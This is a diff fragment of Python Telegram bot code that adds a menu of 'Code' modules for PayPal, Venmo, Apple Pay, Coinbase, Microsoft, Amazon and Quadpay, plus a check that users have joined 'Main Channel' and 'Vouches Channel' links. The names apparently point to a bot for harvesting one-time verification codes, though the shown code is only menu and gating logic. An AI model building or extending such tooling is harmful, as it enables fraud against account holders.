+    ⚙️ Pre\-built modules
+        • /paypal    ➜ Paypal Code
+        • /venmo     ➜ Venmo Code
+        • /applepay  ➜ ApplePay Code
+        • /coinbase  ➜ Coinbase Code
+        • /microsoft ➜ Microsoft Code
+        • /amazon    ➜ Amazon Code
+        • /quadpay   ➜ Quadpay Code""",reply_markup=keyboard,parse_mode='MarkdownV2')
+        else:
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
+                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
+                    ],
+                    [
+                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
+                    ]
+                ]
+                )
+            await callback.message.delete()
+            await callback.message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)
 
 #PROFILE
 @dp.callback_query(F.data.in_(["profile"])) #DONE
